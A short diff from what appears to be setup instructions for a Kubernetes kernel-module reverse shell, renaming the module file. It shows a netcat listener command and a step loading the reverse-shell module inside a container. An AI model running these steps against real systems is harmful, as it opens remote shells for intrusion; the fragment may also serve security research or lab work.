@@ -50,4 +50,4 @@ make clean && make
 nc -lvnp 6999
 
 # Step 5: Load the kernel module (inside the container)
-insmod reverseshell_module.ko
+insmod k8s-lkm-reverse-shell.ko
